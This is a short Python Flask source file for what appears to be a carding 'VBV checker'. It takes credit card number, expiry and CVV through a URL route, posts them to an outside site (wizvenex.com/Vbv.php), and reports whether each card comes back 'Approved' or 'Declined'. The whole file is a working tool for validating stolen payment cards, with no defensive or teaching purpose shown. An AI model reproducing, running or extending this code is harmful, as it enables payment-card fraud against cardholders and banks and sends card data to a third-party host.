from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/gate=vbv2/key=waslost/cc=<path:cc_details>')
def check_vbv(cc_details):
    # Basic CC format check (CC|MM|YYYY|CVV)
    if not len(cc_details.split('|')) == 4:
        return jsonify({
            'error': 'Invalid format. Use CC|MM|YYYY|CVV'
        }), 400

    headers = {
        'authority': 'wizvenex.com',
        'accept': '/',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wizvenex.com',
        'referer': 'https://wizvenex.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {'lista': cc_details}

    try:
        response = requests.post('https://wizvenex.com/Vbv.php', headers=headers, data=data)
        raw_text = response.text

        # Extract status (first span class)
        if 'text-success">APPROVED<' in raw_text:
            status = "Approved"
        else:
            status = "Declined"

        # Extract response (second span class) exactly as shown
        response_start = raw_text.find('class="text-danger">') + 19
        response_end = raw_text.find('</span>', response_start)
        needed_response = raw_text[response_start:response_end].strip()

        return jsonify({
            "response": needed_response,
            "status": status
        })

    except Exception as e:
        return jsonify({
            "response": "Request Failed",
            "status": "Error",
            "details": str(e)
        }), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=6565)
